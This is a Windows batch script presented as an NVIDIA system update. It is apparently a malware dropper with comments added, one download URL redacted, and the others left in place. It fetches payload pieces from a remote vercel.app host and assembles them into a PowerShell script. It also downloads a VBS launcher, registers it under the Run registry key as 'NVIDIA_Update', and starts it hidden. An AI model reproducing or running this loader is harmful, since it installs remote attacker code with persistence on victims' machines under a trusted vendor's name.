@echo off

:: =============================================
:: NVIDIA System Update Script (Cleaned Version)
:: =============================================

:: Clean up previous installation (if any)
rmdir /s /q "%APPDATA%\nvidia_micro" 2>nul

:: ======================
:: Configure Paths
:: ======================
set "BASE_DIR=%APPDATA%\nvidia_micro\logs"
set "MAIN_SCRIPT=%BASE_DIR%\nvs_update.txt"
set "PART1_FILE=%BASE_DIR%\payload_part1.txt"
set "PART2_FILE=%BASE_DIR%\payload_part2.txt"
set "FINAL_PS1=%BASE_DIR%\NVS_UPDATE.PS1"
set "LAUNCHER_VBS=%BASE_DIR%\s-nvs_update.vbs"

:: ======================
:: Create Working Directory
:: ======================
if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"

:: ======================
:: Download Components
:: ======================
:: Download main script template
powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/final.txt' -Destination '%MAIN_SCRIPT%'"

:: Download first payload part
powershell -Command "Start-BitsTransfer -Source 'https://service-omega-snowy.vercel.app/first.txt' -Destination '%PART1_FILE%'"

:: Download second payload part (URL redacted for security)
powershell -Command "Start-BitsTransfer -Source **** -Destination '%PART2_FILE%'"

:: ======================
:: Assemble Final Script
:: ======================
:: Combine parts into final PowerShell script
powershell -Command "(Get-Content '%MAIN_SCRIPT%' -Raw) -replace '----', (Get-Content '%PART1_FILE%' -Raw) -replace '====', (Get-Content '%PART2_FILE%' -Raw) | Set-Content '%MAIN_SCRIPT%'"

:: ======================
:: Cleanup Temp Files
:: ======================
del "%PART1_FILE%" 2>nul
del "%PART2_FILE%" 2>nul

:: ======================
:: Finalize Script
:: ======================
:: Rename to proper PS1 extension
ren "%MAIN_SCRIPT%" "NVS_UPDATE.PS1"

:: ======================
:: Install Persistence
:: ======================
:: Download VBS launcher
powershell -Command "Invoke-WebRequest https://service-omega-snowy.vercel.app/s-nvs_update.vbs -OutFile '%LAUNCHER_VBS%'"

:: Add to Windows startup
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NVIDIA_Update' -Value 'wscript.exe \"%LAUNCHER_VBS%\"'"

:: Launch silently
start /min wscript "%LAUNCHER_VBS%"
